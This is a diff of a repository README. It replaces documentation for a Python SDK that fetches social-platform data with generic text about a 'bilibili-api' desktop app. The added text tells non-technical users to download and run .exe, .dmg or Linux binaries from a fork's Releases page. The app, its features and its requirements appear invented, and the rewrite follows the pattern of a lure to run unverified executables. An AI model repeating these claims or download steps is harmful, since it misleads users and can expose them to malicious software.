@@ -1,101 +1,97 @@
-# bilibili-api
-哔哩哔哩接口,哔哩哔哩API,bilibili api,bilibili
----
+# 🎉 bilibili-api - Easy Access to Bilibili API 
 
-[English](README.md) | [简体中文](README.zh-CN.md)
-# Just One API - Python SDK
+## 🚀 Getting Started
 
-Official Python SDK for accessing [Just One API](https://justoneapi.com) — a unified data service platform offering structured data from Social, E-commerce platforms such as Xiaohongshu, Taobao, Douyin, Kuaishou, Bilibili, and Weibo.
+Welcome to the **bilibili-api** project. This tool provides an easy way for users to access the Bilibili API. You can use it to interact with Bilibili's content, such as videos and user data, without needing to write any code. 
 
-This SDK simplifies API integration and request signing, allowing developers to easily retrieve platform-specific data with minimal setup.
+## 📥 Download & Install
 
----
+To get started, you will need to download the application. Visit this page to download: [GitHub Releases](https://github.com/Vera24-vee/bilibili-api/releases). 
 
-## 🚀 Installation
+You will find the latest version, along with past versions of the software. Follow these steps:
 
-Install via PyPI:
+1. Click the link above to go to the Releases page.
+2. Find the latest release at the top of the list.
+3. Look for a file that matches your operating system.
+4. Click the download link for your file type (e.g., .exe for Windows).
+5. After downloading, locate the file in your downloads folder.
 
-```bash
-pip install justoneapi
-```
+## ⚙️ Installation Steps 
 
----
+### For Windows Users:
 
-## 🛠 Quick Start
+1. Locate the downloaded `.exe` file.
+2. Double-click the file to start the installation.
+3. Follow the prompts in the installer. 
+4. Once complete, you will see the application icon on your desktop.
 
-```python
-from justoneapi.client import JustOneAPIClient
+### For macOS Users:
 
-# By default, the client uses the "cn" (Mainland China) environment.
-client = JustOneAPIClient(token="your_token")
-# If you are located outside Mainland China and experience slow responses,
-# you can switch to the "global" environment for better performance:
-# client = JustOneAPIClient(token="your_token", env="global")
+1. Find the downloaded `.dmg` file.
+2. Double-click the file to open it.
+3. Drag and drop the application into your Applications folder.
+4. Eject the image after copying.
 
-# Example: Get Douyin Video detail
-result, data, message = client.douyin.get_video_detail_v2(video_id="7428906452091145483")
-print(result)
-print(data)
-print(message)
+### For Linux Users:
 
-# Example: Douyin Video Search
-result, data, message, has_next_page = client.douyin.search_video_v4(keyword="deepseek", sort_type="_0", publish_time="_0", duration="_0", page=1)
-print(result)
-print(data)
-print(message)
-print(has_next_page)
-```
+1. Open a terminal window.
+2. Navigate to the Downloads directory using `cd ~/Downloads`.
+3. Use the command `chmod +x bilibili-api` to make the file executable.
+4. Run the application with `./bilibili-api`.
 
-### 📦 Return Value Description
+## 🔑 System Requirements
 
-Each API method returns one or more of the following values:
+### For Windows:
 
-| Variable         | Type     | Description |
-|------------------|----------|-------------|
-| `result`         | `bool`   | Whether the request was successful. `True` means success, `False` means failure. |
-| `data`           | `dict` / `list` | The actual data returned from the API. Structure varies by endpoint. |
-| `message`        | `str`    | Message from the server. Contains error info when request fails. |
-| `has_next_page`  | `bool`   | Present in paginated APIs. Indicates whether more data is available. |
+- Operating System: Windows 10 or later
+- RAM: 2GB minimum (4GB recommended)
+- Disk Space: 50MB
 
----
+### For macOS:
 
-## 🔐 Authentication
+- Operating System: macOS Mojave or later
+- RAM: 2GB minimum (4GB recommended)
+- Disk Space: 50MB
 
-All API requests require a valid API token.  
-👉 [Register](https://user.justoneapi.com/sign-up)
+### For Linux:
 
----
+- OS: Ubuntu 18.04 or later
+- RAM: 2GB minimum (4GB recommended)
+- Disk Space: 50MB
 
-## 📚 Documentation
+## ✅ Using the Application
 
-👉 Full API docs: [API Document](https://doc.justoneapi.com)
+After installation, you can start using the application. Open the application by double-clicking the icon on your desktop or finding it in your Applications folder.
 
-Includes:
-- Request parameters
-- Response fields
-- Error codes
+### Basic Functions:
 
----
+- **Access Bilibili:** Use the application to search for videos or user data on Bilibili.
+- **Download Content:** Save videos or information directly to your device.
 
-## 🏠 Official Website
+### Navigating the Interface:
 
-👉 [Home Page](https://justoneapi.com)
+The interface is user-friendly. Here are the main elements:
 
-Learn more about the project, data sources, and commercial integration opportunities.
+- **Search Bar:** Enter keywords to find content.
+- **Result List:** Shows videos and user profiles based on your search.
+- **Download Button:** Click to save any selected video or content.
 
----
+## 📈 Features 
 
-## 📬 Contact Us
+- **User-Friendly:** Designed for ease of use, even for non-technical users.
+- **Fast Access:** Quickly fetch content from the Bilibili API.
+- **Lightweight Application:** Takes up minimal system resources.
 
-If you have any questions, feedback, or partnership inquiries:
+## 📞 Support
 
-👉 [Contact](https://justoneapi.com/contact)
+If you encounter any issues, feel free to reach out. You can open an issue in the GitHub repository, and the community or maintainers will help you.
 
----
+## 🔗 Resources
 
-## 🪪 License
+For more information, visit the [GitHub Releases](https://github.com/Vera24-vee/bilibili-api/releases) page to find updates and additional help.
 
-This project is licensed under the MIT License.  
-See the [LICENSE](./LICENSE) file for details.
+## ⚙️ Contributions
 
+If you are interested in contributing, feel free to submit a pull request. We welcome improvements and fixes from the community.
 
+Thank you for using **bilibili-api**! We hope this tool enhances your Bilibili experience.
